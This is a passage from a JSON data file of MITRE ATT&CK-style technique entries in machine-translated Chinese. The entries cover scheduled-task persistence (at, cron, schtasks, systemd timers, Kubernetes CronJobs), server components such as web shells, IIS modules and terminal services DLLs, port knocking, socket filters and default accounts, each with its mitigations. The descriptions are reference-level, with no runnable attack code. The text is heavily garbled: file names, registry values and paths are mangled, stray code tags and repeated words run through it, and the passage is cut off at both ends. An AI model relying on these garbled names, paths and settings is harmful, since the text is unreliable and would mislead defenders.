              "content": "限制了没有加密或身份验证机制的协议的使用。限制从不受信任的网络来源访问管理和管理接口。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定协议（例如TFTP）的流量，可以使用网络入侵检测和预防系统来减轻网络级别的活动。签名通常用于协议中的唯一指标，并且可能基于特定对手或工具使用的特定技术，并且在各种网络配置中可能会有所不同。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循供应商设备硬化最佳实践，以禁用不必要的和未使用的功能和服务，避免使用默认配置和密码，并引入记录和审核以进行检测。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "使用身份验证，授权和会计（AAA）系统将限制管理员可以执行并提供用户操作的历史记录，以检测未经授权的使用和滥用。TACACS+可以通过配置身份验证和命令授权来控制哪些命令管理员可以使用哪些命令。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.002",
    "name": "At",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用实用程序，以执行任务计划，以初始或重复执行恶意代码。AT实用程序作为Windows，Linux和MacOS中的可执行文件存在，用于在指定的时间和日期安排任务。尽管对Windows环境中的计划任务的SCHTASK进行了弃用，但使用AT要求运行任务调度程序服务，并且用户将作为本地管理员组的成员登录。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux和MacOS上，可以由Superuser以及添加到"
        },
        {
          "type": "code",
          "content": " at.allow "
        },
        {
          "type": "text",
          "content": "文件中的任何用户调用。如果"
        },
        {
          "type": "code",
          "content": " at.allow "
        },
        {
          "type": "text",
          "content": "文件不存在，则选中"
        },
        {
          "type": "code",
          "content": " at.deny "
        },
        {
          "type": "text",
          "content": "文件。允许在"
        },
        {
          "type": "code",
          "content": " at.deny "
        },
        {
          "type": "text",
          "content": "中未列出的每个用户名。如果存在"
        },
        {
          "type": "code",
          "content": " at。存在"
        },
        {
          "type": "text",
          "content": "是空的，则允许AT的全局使用。如果两个文件都不存在（通常是基线），则仅允许超级用户使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用AT在系统启动或计划持久的基础上执行程序。也可以滥用AT作为横向移动的一部分进行远程执行和/或在指定帐户（例如系统）的上下文下运行一个过程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Linux环境中，对手也可能会滥用通过使用任务产生交互式系统外壳或运行系统命令来破坏受限环境。类似地，如果允许二进制通过"
        },
        {
          "type": "code",
          "content": " sudo "
        },
        {
          "type": "text",
          "content": "作为超级用户运行，则在特权上也可以使用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "诸如PowerSploit框架之类的工具包包含可用于探索系统弱点的系统弱点的动力模块，该系统可用于升级特权。Windows操作系统还创建了一个注册表密钥，该密钥专门与目标主机上的计划任务相关联：Microsoft \\ Windows \\ Windows NT \\ CurrentVersion \\ Schedule \\ Schedule \\ task Cache \\ task Cache \\ tree \\ at1。在Linux和MacOS环境中，可以在本地审核</code>使用<code>的计划任务，也可以通过中央收集的日志记录，使用Syslog或从主机中审核事件进行审核。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "为计划任务配置设置，以强制任务在身份验证的帐户的上下文中运行，而不是允许它们作为系统运行。关联的注册表密钥位于"
            },
            {
              "type": "code",
              "content": " HKLM \\ System \\ CurrentControlset \\ Control \\ LSA \\ submitControl "
            },
            {
              "type": "text",
              "content": "。可以通过GPO进行配置：计算机配置> [策略]> Windows设置>安全设置>安全设置>本地策略>安全选项：域控制器：允许服务器操作员安排任务，设置为禁用。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "配置增加计划优先级选项，以仅允许管理员组安排优先过程的权利。可以通过GPO进行配置：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户权利分配：增加计划优先级。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权并补充特权升级向量，因此只有授权的管理员才能在远程系统上创建计划的任务。在Linux环境中，可以使用"
            },
            {
              "type": "code",
              "content": " at.allow "
            },
            {
              "type": "text",
              "content": "和"
            },
            {
              "type": "code",
              "content": " at.deny "
            },
            {
              "type": "text",
              "content": "文件来管理用户帐户级访问</code> at </code>。AT.Allow中列出的用户可以安排使用AT的操作，而在at.deny文件中列出的用户已禁用实用程序。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.003",
    "name": "Cron",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用"
        },
        {
          "type": "code",
          "content": " cron "
        },
        {
          "type": "text",
          "content": "实用程序以执行任务计划以初始或重复执行恶意代码。"
        },
        {
          "type": "code",
          "content": " cron "
        },
        {
          "type": "text",
          "content": "实用程序是类似于Unix的操作系统的基于时间的工作调度程序。"
        },
        {
          "type": "code",
          "content": " crontab "
        },
        {
          "type": "text",
          "content": "文件包含要运行的cron条目的时间表以及指定的执行时间。任何"
        },
        {
          "type": "code",
          "content": " crontab "
        },
        {
          "type": "text",
          "content": "文件都存储在操作系统特定的文件路径中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以在Linux或Unix环境中使用"
        },
        {
          "type": "code",
          "content": " cron "
        },
        {
          "type": "text",
          "content": "在系统启动或计划的基础上执行程序以进行持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "查看"
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "时间表的更改。"
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "可以在"
            },
            {
              "type": "code",
              "content": "/var/log "
            },
            {
              "type": "text",
              "content": "目录中审查执行。要验证"
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "日志文件的位置，请在"
            },
            {
              "type": "code",
              "content": " /etc/rsyslog.conf "
            },
            {
              "type": "text",
              "content": " </code>或"
            },
            {
              "type": "code",
              "content": " /etc/syslog.conf </code "
            },
            {
              "type": "text",
              "content": "中检查syslog配置。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": ""
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "权限由"
            },
            {
              "type": "code",
              "content": " /etc/cron.allow和/etc/cron.deny "
            },
            {
              "type": "text",
              "content": "控制。如果有一个"
            },
            {
              "type": "code",
              "content": " cron.allow "
            },
            {
              "type": "text",
              "content": "文件，则需要在文件中列出"
            },
            {
              "type": "code",
              "content": " cron "
            },
            {
              "type": "text",
              "content": "的用户或用户。"
            },
            {
              "type": "code",
              "content": " cron.deny "
            },
            {
              "type": "text",
              "content": "用于明确禁止用户使用cron。如果两者都不存在，则只允许超级用户运行cron。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.005",
    "name": "Scheduled Task",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Windows任务调度程序，以执行任务计划以初始或重复执行恶意代码。有多种方法可以访问Windows中的任务调度程序。Schtasks实用程序可以直接在命令行上运行，也可以在控制面板的管理员工具部分中通过GUI打开任务调度程序。在某些情况下，对手已经为Windows任务调度程序使用了.NET包装器，或者，对手使用Windows NetApi32库来创建计划的任务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手（例如：at）也可能会滥用实用程序的弃用，尽管"
        },
        {
          "type": "code",
          "content": " at.exe "
        },
        {
          "type": "text",
          "content": "无法访问用"
        },
        {
          "type": "code",
          "content": " schtasks "
        },
        {
          "type": "text",
          "content": "或控制面板创建的任务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用Windows任务调度程序在系统启动或计划的基础上执行程序以进行持久性。Windows任务调度程序还可以滥用以作为横向移动的一部分进行远程执行和/或在指定帐户的上下文（例如系统）下运行过程。与系统二进制代理执行类似，对手也滥用了Windows任务调度程序，以在签名/受信任的系统流程下可能掩盖一次性执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以创建“隐藏”的计划任务（即隐藏文物），这些任务可能不可见，用于列举任务的工具和手动查询。具体而言，对手可以通过删除关联的安全描述符（SD）注册表值（必须使用系统权限完成此值的删除）来隐藏"
        },
        {
          "type": "code",
          "content": " schtasks /Query < /code < /code < /code>和任务调度程序的任务。对手也可以采用替代方法隐藏任务，例如更改关联注册表密钥中的元数据（例如 index "
        },
        {
          "type": "text",
          "content": "值）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "诸如PowerSploit框架之类的工具包包含可用于探索系统弱点的系统弱点的动力模块，该系统可用于升级特权。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "为计划任务配置设置，以强制任务在身份验证的帐户的上下文中运行，而不是允许它们作为系统运行。关联的注册表密钥位于HKLM \\ System \\ CurrentControlset \\ Control \\ LSA \\ submitControl。可以通过GPO进行配置：计算机配置> [策略]> Windows设置>安全设置>安全设置>本地策略>安全选项：域控制器：允许服务器操作员安排任务，设置为禁用。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "配置增加计划优先级选项，以仅允许管理员组安排优先过程的权利。可以通过GPO进行配置：计算机配置> [策略]> Windows设置>安全设置>本地策略>用户权利分配：增加计划优先级。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权并补充特权升级向量，因此只有授权的管理员才能在远程系统上创建计划的任务。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.006",
    "name": "Systemd Timers",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用SystemD计时器来执行任务计划，以初始或重复执行恶意代码。SystemD计时器是具有文件扩展名"
        },
        {
          "type": "code",
          "content": " .timer "
        },
        {
          "type": "text",
          "content": "该控制服务的单位文件。可以将计时器设置为在日历事件上或相对于起点的时间跨度之后运行。它们可以用作Linux环境中CRON的替代方案。可以通过"
        },
        {
          "type": "code",
          "content": " systemctl "
        },
        {
          "type": "text",
          "content": "命令行实用程序来远程激活SystemD计时器，该实用程序可通过SSH运行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "每个"
        },
        {
          "type": "code",
          "content": " .timer "
        },
        {
          "type": "text",
          "content": "文件必须具有相应的"
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "带有相同名称的文件，例如"
        },
        {
          "type": "code",
          "content": " example.timer "
        },
        {
          "type": "text",
          "content": " and code> example.service.service.service </代码>。"
        },
        {
          "type": "code",
          "content": " .service "
        },
        {
          "type": "text",
          "content": "文件是由SystemD System和Service Manager管理的SystemD Service单元文件。特权计时器写入"
        },
        {
          "type": "code",
          "content": "/etc/systemd/system/"
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "/usr/lib/lib/systemd/system "
        },
        {
          "type": "text",
          "content": "时，用户级别写入"
        },
        {
          "type": "code",
          "content": "〜/.config/systemd/用户/"
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用SystemD计时器在系统启动或计划的基础上执行恶意代码。使用特权路径安装的计时器可用于维持根级持久性。对手也可以安装用户级计时器以实现用户级别的持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对根帐户的访问，并防止用户创建和/或修改SystemD Timer单元文件。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对SystemD "
            },
            {
              "type": "code",
              "content": " .timer "
            },
            {
              "type": "text",
              "content": "单元文件的读/写入访问仅选择有合法需要管理系统服务的特权用户。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将对系统实用程序（例如“ SystemCtl”或“ SystemD-run””等系统实用程序的访问限制为有合法需求的用户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1053.007",
    "name": "Container Orchestration Job",
    "tactics": [
      {
        "id": "TA0002",
        "name": "Execution"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Scheduled Task/Job",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用由容器编排工具（例如Kubernetes）提供的任务调度功能，以安排配置为执行恶意代码的容器的部署。集装箱编排作业在特定的日期和时间运行这些自动任务，类似于Linux系统上的Cron作业。此类型的部署也可以配置为随着时间的推移维护数量的容器，从而自动化了在集群中保持持久性的过程。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Kubernetes中，可以使用Cronjob来安排运行一个或多个容器以执行特定任务的作业。因此，对手可以利用cronjob安排在集群中各个节点中执行恶意代码的作业部署。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保默认情况下的容器不作为根。在Kubernetes环境中，考虑定义POD安全标准，以防止POD运行特权容器。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权并补充特权升级向量，因此只有授权的管理员才能创建集装箱编排作业。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1505.001",
    "name": "SQL Stored Procedures",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Server Software Component",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用SQL存储程序，以建立对系统的持续访问。SQL存储过程是可以保存和重复使用的代码，因此数据库用户不会浪费时间重写经常使用的SQL查询。可以使用过程名称或定义的事件通过SQL语句或数据库调用存储过程（例如，启动/重新启动SQL Server应用程序时）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会制作恶意存储程序，以提供SQL数据库服务器中的持久机制。要通过SQL语法执行操作系统命令，对手可能必须启用其他功能，例如MSSQL Server的XP_CMDShell。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Microsoft SQL Server可以启用通用语言运行时（CLR）集成。通过启用CLR集成，应用程序开发人员可以使用任何.NET Framework语言（例如VB .NET，C＃等）编写存储过程。对手可以制作或修改链接到存储过程的CLR组件，因为可以制作这些CLR组件以执行任意命令。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期在关键服务上检查组件软件，而对手可能会针对持久性来验证系统的完整性并确定是否已经进行了意外更改。"
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "确保正确的应用程序开发人员签署了所有应用程序组件二进制文件。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "请勿允许具有权限的管理员帐户在这些服务上添加组件软件，以用于日常操作，这些软件可能会使它们暴露于无私人系统上的潜在对手。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1505.002",
    "name": "Transport Agent",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Server Software Component",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用微软运输代理，以建立对系统的持续访问。Microsoft Exchange Transport Agents可以通过通过运输管道的电子邮件进行操作，以执行各种任务，例如过滤垃圾邮件，过滤恶意附件，日记或在所有传出电子邮件的末尾添加公司签名。运输代理可以由应用程序开发人员编写，然后编译为随后在Exchange Server注册的.NET组件。运输代理将在电子邮件处理的指定阶段调用，并执行开发人员定义的任务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以注册恶意运输代理，以在交换服务器中提供持久机制，该机制可以由对手指定的电子邮件事件触发。尽管可以针对通过Exchange Transport Pipeline的所有电子邮件调用恶意运输代理，但可以将代理配置为仅针对对手定义的标准执行特定任务。例如，如果收件人电子邮件地址与对手提供的列表上的条目匹配，则运输代理只能执行诸如复制内部附件并将其保存以进行拆卸之类的操作。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期在关键服务上检查组件软件，而对手可能会针对持久性来验证系统的完整性并确定是否已经进行了意外更改。"
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "确保正确的应用程序开发人员签署了所有应用程序组件二进制文件。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "请勿允许具有权限的管理员帐户在这些服务上添加组件软件，以用于日常操作，这些软件可能会使它们暴露于无私人系统上的潜在对手。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1505.003",
    "name": "Web Shell",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Server Software Component",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会使用Web壳后门服务器来建立对系统的持续访问。Web Shell是一个Web脚本，它位于公开访问的Web服务器上，以允许对手将Web服务器用作进入网络的网关。Web Shell可以提供一组函数以执行的执行或托管Web服务器的系统上的命令行界面。"
        }
      ],
      [
        {
          "type": "text",
          "content": "除了服务器端脚本外，Web Shell可能还具有用于与Web服务器交谈的客户端接口程序（例如，China Cheber Web Shell Client）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑从Web技术（例如"
            },
            {
              "type": "code",
              "content": " evai（）"
            },
            {
              "type": "text",
              "content": "> Web shell的Web技术中禁用功能。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "通过限制用户帐户的特权来执行最低特权的原则，因此只有授权帐户才能修改Web目录。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1505.004",
    "name": "IIS Components",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Server Software Component",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以安装在Internet信息服务（IIS）网络服务器上运行的恶意组件以建立持久性。IIS提供了多种扩展Web服务器功能的机制。例如，可以安装Internet Server应用程序编程接口（ISAPI）扩展程序和过滤器，以检查和/或修改传入和发出的IIS Web请求。扩展和过滤器被部署为导出三个函数的DLL文件："
        },
        {
          "type": "code",
          "content": " get {extension/filter}版本"
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " http {extension/filter/filter} proc "
        },
        {
          "type": "text",
          "content": "，（（选项）"
        },
        {
          "type": "code",
          "content": "）终止{扩展/过滤器} "
        },
        {
          "type": "text",
          "content": "。也可以安装IIS模块以扩展IIS Web服务器。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以安装恶意ISAPI扩展和过滤器，以观察和/或修改流量，在折衷的机器上执行命令，或者代理命令和控制流量。ISAPI扩展和过滤器可能可以访问所有IIS Web请求和响应。例如，对手可能会滥用这些机制来修改HTTP响应，以便将恶意命令/内容分发给先前的主机。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以安装恶意IIS模块以观察和/或修改流量。IIS 7.0引入的模块提供了对HTTP请求和响应的不受限制访问，与ISAPI扩展名和过滤器。IIS模块可以写为DLL，该DLL导出"
        },
        {
          "type": "code",
          "content": " registerModule "
        },
        {
          "type": "text",
          "content": "，也可以将其与ASP.NET API接口以访问IIS HTTP请求的.NET应用程序。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期检查已安装的IIS组件以验证Web服务器的完整性并确定是否已进行了意外更改。"
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "确保正确的应用程序开发人员签署了IIS DLL和二进制文件。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "通过指定可以在IIS上运行的ISAPI扩展名和过滤器的列表来限制未允许的ISAPI扩展名和过滤器运行。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "请勿允许具有权限的管理员帐户添加IIS组件，以用于日常操作，这些操作可能会将这些权限暴露于潜在的对手和/或其他无私人系统。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1505.005",
    "name": "Terminal Services DLL",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Server Software Component",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用终端服务的组成部分，以实现对系统的持续访问。Microsoft Terminal Services，截至2022年，某些Windows Server OSS中的远程桌面服务重命名为远程桌面服务，可实现远程终端连接到主机。终端服务允许服务器通过RDP将完整的，交互式的图形用户界面传输到客户端。"
        }
      ],
      [
        {
          "type": "text",
          "content": "以“通用”过程运行的Windows Services（ex："
        },
        {
          "type": "code",
          "content": " svchost.exe "
        },
        {
          "type": "text",
          "content": "）加载服务的DLL文件，其位置存储在注册表条目中，名为"
        },
        {
          "type": "code",
          "content": " servicecy> servicececyl "
        },
        {
          "type": "text",
          "content": " </code>。"
        },
        {
          "type": "code",
          "content": " enterrv.dll "
        },
        {
          "type": "text",
          "content": "文件，通常存储在"
        },
        {
          "type": "code",
          "content": "％SystemRoot％\\ System32 \\ "
        },
        {
          "type": "text",
          "content": "中，是默认的"
        },
        {
          "type": "code",
          "content": " serviced> servicedly </code "
        },
        {
          "type": "text",
          "content": " "
        },
        {
          "type": "code",
          "content": " hklm中终端服务的值\\ System \\ currentControlset \\ Services \\ TERMERVICE \\ parameters \\ "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以修改和/或替换终端服务DLL，以使受害的主机持续访问。可以对此DLL进行修改，以执行任意有效载荷（同时可能保留正常"
        },
        {
          "type": "code",
          "content": " enterrv.dll "
        },
        {
          "type": "text",
          "content": "功能），并且简单地启用了终端服务的滥用功能。例如，对手可以通过修补"
        },
        {
          "type": "code",
          "content": " enterrv.dll "
        },
        {
          "type": "text",
          "content": " file或修改"
        },
        {
          "type": "code",
          "content": " servicedll </code </code </code </code </code </code </code </code </code </code </code </code </code </code </code </code </code </code </code </code </code </code </code "
        },
        {
          "type": "text",
          "content": "值以指向DLL的DLL来启用诸如并发远程桌面协议会话之类的功能RDP功能。在非服务器窗口OS上，增加功能也可能使对手避免终端服务提示创建新的RDP会话时警告/注销系统的用户。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期在关键服务上检查组件软件，而对手可能会针对持久性来验证系统的完整性并确定是否已经进行了意外更改。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑使用组策略对注册表中的终端服务参数进行配置和阻止修改。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1205.001",
    "name": "Port Knocking",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Traffic Signaling",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用端口敲门来隐藏用于持久性或命令和控制的开放端口。为了启用端口，对手会将一系列尝试的连接发送到预定义的封闭端口序列。序列完成后，打开端口通常由基于主机的防火墙完成，但也可以通过自定义软件实现。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对于听力端口的动态开放，以及在另一个系统上与侦听服务器的连接的启动，已经观察到了这一技术。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以通过不同的方法进行触发信号数据包的观察。最初由CD00R实施的一种手段是使用LibPCAP库来嗅探有关数据包。另一种方法利用了原始插座，这使恶意软件能够使用已打开的端口，以供其他程序使用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "可以通过使用状态防火墙来实现这种技术的某些变体，具体取决于其实施方式。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1205.002",
    "name": "Socket Filters",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Traffic Signaling",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将过滤器连接到网络插座以监视，然后激活用于持久或命令和控制的后门。使用升高的权限，对手可以使用诸如"
        },
        {
          "type": "code",
          "content": " libpcap "
        },
        {
          "type": "text",
          "content": "库之类的功能打开插座并安装过滤器，以允许或禁止某些类型的数据通过套接字。过滤器可以应用于通过指定的网络接口（如果未指定）的所有流量（或每个接口）。当网络接口接收到匹配过滤器标准的数据包时，可以在主机上触发其他操作，例如反向外壳的激活。"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了建立连接，对手将制作的数据包发送到与已安装的滤波器标准相匹配的目标主机。对手已经使用这些套接字过滤器来触发植入物的安装，进行ping背部并调用命令壳。与这些插座过滤器的通信也可以与协议隧道结合使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用"
        },
        {
          "type": "code",
          "content": " libpcap "
        },
        {
          "type": "text",
          "content": "安装的任何类似Unix的平台上安装过滤器，也可以使用"
        },
        {
          "type": "code",
          "content": " winpcap "
        },
        {
          "type": "text",
          "content": "安装</code>。对手可以使用"
        },
        {
          "type": "code",
          "content": " libpcap "
        },
        {
          "type": "text",
          "content": "与"
        },
        {
          "type": "code",
          "content": " pcap_setfilter "
        },
        {
          "type": "text",
          "content": "或标准库功能"
        },
        {
          "type": "code",
          "content": " setSockopt "
        },
        {
          "type": "text",
          "content": " so_attach_filter </code> options setsockopt </code>。由于插座连接在收到数据包之前不活动，因此由于主机上缺乏活动，低CPU开销以及对原始插座使用情况的可见性有限，因此可能难以检测此行为。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "可以通过使用状态防火墙来实现这种技术的某些变体，具体取决于其实施方式。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.001",
    "name": "Default Accounts",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0001",
        "name": "Initial Access"
      }
    ],
    "technique": "Valid Accounts",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会获得默认帐户的滥用证书，以此作为获得初始访问，持久性，特权升级或逃避国防的一种手段。默认帐户是一个内置的OS，例如Windows系统上的来宾或管理员帐户。默认帐户还包括其他类型的系统，软件或设备（包括AWS中的root用户帐户和kubernetes中的默认服务帐户）上的默认工厂/提供商集帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "默认帐户不仅限于客户端机器，还包括用于设备（例如内部，开源或商业）等设备（例如网络设备和计算机应用程序）的帐户。带有用户名和密码组合的电器对不更改安装后的组织构成了严重威胁，因为它们是对手的容易目标。同样，对手也可以利用公开披露或被盗的私钥或凭证材料来合法地通过远程服务连接到远程环境。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "使用默认用户名和密码的应用程序和设备应在安装后以及部署到生产环境之前立即更改。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078.002",
    "name": "Domain Accounts",
    "tactics": [
      {
